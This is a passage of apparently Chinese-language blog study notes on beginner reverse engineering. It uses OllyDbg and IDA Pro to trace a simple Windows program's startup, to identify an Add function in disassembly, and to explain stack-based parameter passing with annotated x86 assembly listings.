<h2 id="启动函数"><a class="anchor" href="#启动函数">#</a> 启动函数</h2>
<p>样例源代码：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>LRESULT CALLBACK <span class="token function">WndProc</span> <span class="token punctuation">(</span>HWND<span class="token punctuation">,</span> UINT<span class="token punctuation">,</span> WPARAM<span class="token punctuation">,</span> LPARAM<span class="token punctuation">)</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">int</span> WINAPI <span class="token function">WinMain</span> <span class="token punctuation">(</span>HINSTANCE hInstance<span class="token punctuation">,</span> HINSTANCE hPrevInstance<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="6"></td><td><pre>                    PSTR szCmdLine<span class="token punctuation">,</span> <span class="token keyword">int</span> iCmdShow<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#123;</span><span class="token comment">// 注册窗口类</span></pre></td></tr><tr><td data-num="8"></td><td><pre>     <span class="token keyword">static</span> TCHAR szAppName<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">TEXT</span> <span class="token punctuation">(</span><span class="token string">"chap231"</span><span class="token punctuation">)</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>     HWND         hwnd <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>     MSG          msg <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>     WNDCLASS     wndclass <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>     wndclass<span class="token punctuation">.</span>style         <span class="token operator">=</span> CS_HREDRAW <span class="token operator">|</span> CS_VREDRAW <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>     wndclass<span class="token punctuation">.</span>lpfnWndProc   <span class="token operator">=</span> WndProc <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>     wndclass<span class="token punctuation">.</span>cbClsExtra    <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>     wndclass<span class="token punctuation">.</span>cbWndExtra    <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>     wndclass<span class="token punctuation">.</span>hInstance     <span class="token operator">=</span> hInstance <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>     wndclass<span class="token punctuation">.</span>hIcon         <span class="token operator">=</span> <span class="token function">LoadIcon</span> <span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> IDI_APPLICATION<span class="token punctuation">)</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>     wndclass<span class="token punctuation">.</span>hCursor       <span class="token operator">=</span> <span class="token function">LoadCursor</span> <span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> IDC_ARROW<span class="token punctuation">)</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>     wndclass<span class="token punctuation">.</span>hbrBackground <span class="token operator">=</span> <span class="token punctuation">(</span>HBRUSH<span class="token punctuation">)</span> <span class="token function">GetStockObject</span> <span class="token punctuation">(</span>WHITE_BRUSH<span class="token punctuation">)</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>     wndclass<span class="token punctuation">.</span>lpszMenuName  <span class="token operator">=</span> <span class="token constant">NULL</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>     wndclass<span class="token punctuation">.</span>lpszClassName <span class="token operator">=</span> szAppName <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">RegisterClass</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>wndclass<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>          <span class="token keyword">return</span> <span class="token number">0</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        </pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token comment">// 创建 window</span></pre></td></tr><tr><td data-num="28"></td><td><pre>     hwnd <span class="token operator">=</span> <span class="token function">CreateWindow</span> <span class="token punctuation">(</span>szAppName<span class="token punctuation">,</span>                  </pre></td></tr><tr><td data-num="29"></td><td><pre>                          <span class="token function">TEXT</span> <span class="token punctuation">(</span><span class="token string">"静态分析技术实例"</span><span class="token punctuation">)</span> <span class="token punctuation">,</span>  </pre></td></tr><tr><td data-num="30"></td><td><pre>                          WS_OVERLAPPEDWINDOW<span class="token punctuation">,</span>         </pre></td></tr><tr><td data-num="31"></td><td><pre>                          CW_USEDEFAULT<span class="token punctuation">,</span>               </pre></td></tr><tr><td data-num="32"></td><td><pre>                          CW_USEDEFAULT<span class="token punctuation">,</span>               </pre></td></tr><tr><td data-num="33"></td><td><pre>                          CW_USEDEFAULT<span class="token punctuation">,</span>               </pre></td></tr><tr><td data-num="34"></td><td><pre>                          CW_USEDEFAULT<span class="token punctuation">,</span>               </pre></td></tr><tr><td data-num="35"></td><td><pre>                          <span class="token constant">NULL</span><span class="token punctuation">,</span>                       </pre></td></tr><tr><td data-num="36"></td><td><pre>                          <span class="token constant">NULL</span><span class="token punctuation">,</span>                       </pre></td></tr><tr><td data-num="37"></td><td><pre>                          hInstance<span class="token punctuation">,</span>                  </pre></td></tr><tr><td data-num="38"></td><td><pre>                          <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>                      </pre></td></tr><tr><td data-num="39"></td><td><pre>     </pre></td></tr><tr><td data-num="40"></td><td><pre>     <span class="token function">ShowWindow</span> <span class="token punctuation">(</span>hwnd<span class="token punctuation">,</span> iCmdShow<span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token comment">// 显示窗口</span></pre></td></tr><tr><td data-num="41"></td><td><pre>     <span class="token function">UpdateWindow</span> <span class="token punctuation">(</span>hwnd<span class="token punctuation">)</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>     </pre></td></tr><tr><td data-num="43"></td><td><pre>     <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">GetMessage</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>msg<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="44"></td><td><pre>     <span class="token punctuation">&#123;</span><span class="token comment">// 消息循环，接收处理消息</span></pre></td></tr><tr><td data-num="45"></td><td><pre>          <span class="token function">TranslateMessage</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>msg<span class="token punctuation">)</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>          <span class="token function">DispatchMessage</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>msg<span class="token punctuation">)</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>     <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>     <span class="token keyword">return</span> msg<span class="token punctuation">.</span>wParam <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="50"></td><td><pre></pre></td></tr><tr><td data-num="51"></td><td><pre>LRESULT CALLBACK <span class="token function">WndProc</span> <span class="token punctuation">(</span>HWND hwnd<span class="token punctuation">,</span> UINT message<span class="token punctuation">,</span> WPARAM wParam<span class="token punctuation">,</span> LPARAM lParam<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="52"></td><td><pre><span class="token punctuation">&#123;</span><span class="token comment">// 消息响应</span></pre></td></tr><tr><td data-num="53"></td><td><pre>	 <span class="token keyword">int</span> input<span class="token punctuation">;</span>    </pre></td></tr><tr><td data-num="54"></td><td><pre>     <span class="token keyword">switch</span> <span class="token punctuation">(</span>message<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="55"></td><td><pre>     <span class="token punctuation">&#123;</span>         </pre></td></tr><tr><td data-num="56"></td><td><pre>	<span class="token keyword">case</span> WM_DESTROY<span class="token operator">:</span></pre></td></tr><tr><td data-num="57"></td><td><pre>          <span class="token function">PostQuitMessage</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="58"></td><td><pre>          <span class="token keyword">return</span> <span class="token number">0</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="59"></td><td><pre></pre></td></tr><tr><td data-num="60"></td><td><pre>    <span class="token keyword">case</span> WM_CLOSE<span class="token operator">:</span></pre></td></tr><tr><td data-num="61"></td><td><pre>		input<span class="token operator">=</span><span class="token function">MessageBox</span><span class="token punctuation">(</span>hwnd<span class="token punctuation">,</span><span class="token function">TEXT</span> <span class="token punctuation">(</span><span class="token string">"你真的决定退出吗?"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">TEXT</span> <span class="token punctuation">(</span><span class="token string">"退出"</span><span class="token punctuation">)</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="62"></td><td><pre>						 MB_YESNO<span class="token operator">|</span>MB_ICONQUESTION<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>		<span class="token keyword">switch</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="64"></td><td><pre>			<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="65"></td><td><pre>			<span class="token keyword">case</span> IDYES<span class="token operator">:</span></pre></td></tr><tr><td data-num="66"></td><td><pre>				<span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="67"></td><td><pre>			<span class="token keyword">case</span> IDNO<span class="token operator">:</span></pre></td></tr><tr><td data-num="68"></td><td><pre>				<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="69"></td><td><pre>			<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="70"></td><td><pre>     <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="71"></td><td><pre>     <span class="token keyword">return</span> <span class="token function">DefWindowProc</span> <span class="token punctuation">(</span>hwnd<span class="token punctuation">,</span> message<span class="token punctuation">,</span> wParam<span class="token punctuation">,</span> lParam<span class="token punctuation">)</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="72"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>OD 打开应用程序，直接进入如下页面</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220326200117511.png" alt="image-20220326200117511" /></p>
<p>也就是说在 Windows 窗口程序中，它并不是直接停在 Winmian 函数上，而是停在系统的提供函数上，从而进行一些资源的预分配等。</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 确定系统版本</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">004011</span>A6  <span class="token operator">|</span><span class="token punctuation">.</span>  FF15 <span class="token number">40404000</span> CALL DWORD PTR DS<span class="token operator">:</span><span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">&amp;</span>KERNEL32<span class="token punctuation">.</span>GetVersion<span class="token operator">></span><span class="token punctuation">;</span>  KERNEL32<span class="token punctuation">.</span>GetVersion</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">// 指向进程的完整命令行指针</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">004011F</span><span class="token number">4</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  FF15 <span class="token number">3</span>C404000 CALL DWORD PTR DS<span class="token operator">:</span><span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">&amp;</span>KERNEL32<span class="token punctuation">.</span>GetCommand<span class="token operator">></span><span class="token punctuation">;</span> <span class="token punctuation">[</span>GetCommandLineA</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment">// 获取进程的启动信息</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">0040121</span>E  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">50</span>            PUSH EAX                                 <span class="token punctuation">;</span> <span class="token operator">/</span>pStartupinfo</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">0040121F</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  FF15 <span class="token number">38404000</span> CALL DWORD PTR DS<span class="token operator">:</span><span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">&amp;</span>KERNEL32<span class="token punctuation">.</span>GetStartup<span class="token operator">></span><span class="token punctuation">;</span> \GetStartupInfoA</pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token comment">// 返回地址空间执行文件的基地址，以参数形式放在此处</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">00401241</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">56</span>            PUSH ESI                                 <span class="token punctuation">;</span> <span class="token operator">|</span><span class="token operator">/</span>pModule</pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token number">00401242</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  FF15 <span class="token number">34404000</span> CALL DWORD PTR DS<span class="token operator">:</span><span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">&amp;</span>KERNEL32<span class="token punctuation">.</span>GetModuleH<span class="token operator">></span><span class="token punctuation">;</span> <span class="token operator">|</span>\GetModuleHandleA</pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token comment">// 主函数入口 winmain</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token number">00401249</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 B2FDFFFF   CALL ReverseM<span class="token punctuation">.</span><span class="token number">00401000</span>                   <span class="token punctuation">;</span> \ReverseM<span class="token punctuation">.</span><span class="token number">00401000</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token comment">// 退出函数 exit 或者 ExitProcess</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token number">00401252</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">95000000</span>   CALL ReverseM<span class="token punctuation">.</span><span class="token number">004012</span>EC</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220326201921761.png" alt="image-20220326201921761" /></p>
<p>分析函数时也即在 winmain 函数处进行断点，然后 f9 执行到断点处</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220326202110521.png" alt="image-20220326202110521" /></p>
<p>f8：单步步过，f7：单步步入</p>
<h2 id="函数的识别"><a class="anchor" href="#函数的识别">#</a> 函数的识别</h2>
<p>样例源码：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> <span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">main</span><span class="token punctuation">(</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>	 	<span class="token keyword">int</span> a<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">;</span><span class="token comment">// 实参</span></pre></td></tr><tr><td data-num="5"></td><td><pre>		<span class="token function">Add</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	 	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre> <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">)</span><span class="token comment">// 形参</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>		<span class="token keyword">return</span><span class="token punctuation">(</span>x<span class="token operator">+</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h3 id="动态分析"><a class="anchor" href="#动态分析">#</a> 动态分析</h3>
<p>在反汇编中识别函数代码</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220327170147621.png" alt="image-20220327170147621" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">004010</span>CF  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">2</span>CFFFFFF   CALL add<span class="token punctuation">.</span><span class="token number">00401000</span>                        <span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="2"></td><td><pre>如果是控制台就是三个参数，main 如果是win32窗口，就是四个参数，winmain</pre></td></tr></table></figure><p>f2 断点，f9 执行到这然后 f7 进入</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220327170302868.png" alt="image-20220327170302868" /></p>
<p>函数分析如下：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220327170535360.png" alt="image-20220327170535360" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00401000</span>  <span class="token operator">/</span>$  <span class="token number">6</span>A <span class="token number">06</span>         PUSH <span class="token number">6</span>                                   <span class="token punctuation">;</span>  参数<span class="token number">2</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00401002</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">6</span>A <span class="token number">05</span>         PUSH <span class="token number">5</span>                                   <span class="token punctuation">;</span>  参数<span class="token number">1</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00401004</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">07000000</span>   CALL add<span class="token punctuation">.</span><span class="token number">00401010</span>                        <span class="token punctuation">;</span>  调用的函数 call <span class="token operator">=</span> push eip jmp <span class="token number">00401010</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">00401009</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">08</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">8</span>                                <span class="token punctuation">;</span>  平栈，保持堆栈平衡</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">0040100</span>C  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">33</span>C0          XOR EAX<span class="token punctuation">,</span>EAX                              <span class="token punctuation">;</span>  对eax进行清零</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">0040100</span>E  \<span class="token punctuation">.</span>  C3            RETN                                     <span class="token punctuation">;</span>  返回</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220327170908883.png" alt="image-20220327170908883" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00401010</span>  <span class="token operator">/</span>$  <span class="token number">8</span>B4424 <span class="token number">08</span>     MOV EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>ESP<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00401014</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B4C24 <span class="token number">04</span>     MOV ECX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>ESP<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00401018</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">03</span>C1          ADD EAX<span class="token punctuation">,</span>ECX</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">0040101</span>A  \<span class="token punctuation">.</span>  C3            RETN</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">0040101</span>B      <span class="token number">90</span>            NOP                                      <span class="token punctuation">;</span>  call的地址，就是函数开始的地方，ret或者retn就是函数结束的地方，pop eip jmp eip</pre></td></tr></table></figure><h3 id="静态分析"><a class="anchor" href="#静态分析">#</a> 静态分析</h3>
<p>ida pro 打开如下</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220327171038457.png" alt="image-20220327171038457" /></p>
<p>f5 反汇编，调用 sub_401010 函数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220327171120924.png" alt="image-20220327171120924" /></p>
<p>sub_401010 函数如下：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220327171148160.png" alt="image-20220327171148160" /></p>
<p>add 汇编代码：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220327171241181.png" alt="image-20220327171241181" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2C21CB942FA37E5975FF8FFBD3F3BF48.gif" alt="img-2C21CB942FA37E5975FF8FFBD3F3BF48" /></p>
]]></content>
      <categories>
        <category>逆向工程</category>
      </categories>
      <tags>
        <tag>逆向工程</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向工程Studying Notes Days 8</title>
    <url>/article/b4ab0f6d.html</url>
    <content><![CDATA[<h1 id="32位逆向分析"><a class="anchor" href="#32位逆向分析">#</a> 32 位逆向分析</h1>
<h2 id="利用堆栈传递参数"><a class="anchor" href="#利用堆栈传递参数">#</a> 利用堆栈传递参数</h2>
<p>函数的参数分为以下几种传参方式：</p>
<ul>
<li>全局变量传参</li>
<li>堆栈传参</li>
<li>寄存器传参</li>
</ul>
<p>OD 打开分析；</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220327171832502.png" alt="image-20220327171832502" /></p>
<p>可以看到如下为退出程序</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00401009</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BD8          MOV EBX<span class="token punctuation">,</span>EAX</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">0040100</span>B  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">6</span>A <span class="token number">00</span>         PUSH <span class="token number">0</span>                                   <span class="token punctuation">;</span> <span class="token operator">/</span>ExitCode <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">0040100</span>D  \<span class="token punctuation">.</span>  FF15 <span class="token number">00204000</span> CALL DWORD PTR DS<span class="token operator">:</span><span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">&amp;</span>KERNEL32<span class="token punctuation">.</span>ExitProces<span class="token operator">></span><span class="token punctuation">;</span> \ExitProcess</pre></td></tr></table></figure><p>f8 执行到 call 函数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220327172023394.png" alt="image-20220327172023394" /></p>
<p>f7 进入</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">0040101F</span>  <span class="token operator">/</span>$  <span class="token number">55</span>            PUSH EBP</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00401020</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BEC          MOV EBP<span class="token punctuation">,</span>ESP</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00401022</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>EC <span class="token number">04</span>       SUB ESP<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">00401025</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B45 <span class="token number">0</span>C       MOV EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">+</span>C<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">00401028</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B5D <span class="token number">08</span>       MOV EBX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">0040102</span>B  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">895</span>D FC       MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>EBX</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">0040102</span>E  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">0345</span> FC       ADD EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">00401031</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">04</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">00401034</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5</span>D            POP EBP</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">00401035</span>  \<span class="token punctuation">.</span>  C2 <span class="token number">0800</span>       RETN <span class="token number">8</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220327172038255.png" alt="image-20220327172038255" /></p>
<p>push ebp 是因为堆栈有俩个寄存器</p>
<ul>
<li>esp：栈顶指针</li>
<li>ebp：栈底指针</li>
</ul>
<p>而 push ebp 的作用则是将原来的堆栈保存起来，防止被破坏，从而开辟一个新的堆栈供之后的函数使用。</p>
<p>函数分析：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">0040101</span>E      <span class="token number">00</span>            DB <span class="token number">00</span>                                    <span class="token punctuation">;</span>  ebp <span class="token operator">+</span> 的普遍是参数 ebp<span class="token operator">-</span> 的普遍是局部变量</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">0040101F</span>  <span class="token operator">/</span>$  <span class="token number">55</span>            PUSH EBP                                 <span class="token punctuation">;</span>  保护现场</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00401020</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BEC          MOV EBP<span class="token punctuation">,</span>ESP</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">00401022</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>EC <span class="token number">04</span>       SUB ESP<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">00401025</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B45 <span class="token number">0</span>C       MOV EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">+</span>C<span class="token punctuation">]</span>             <span class="token punctuation">;</span>  参数<span class="token number">2</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">00401028</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B5D <span class="token number">08</span>       MOV EBX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span>             <span class="token punctuation">;</span>  参数<span class="token number">1</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">0040102</span>B  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">895</span>D FC       MOV DWORD PTR SS<span class="token operator">:</span><span 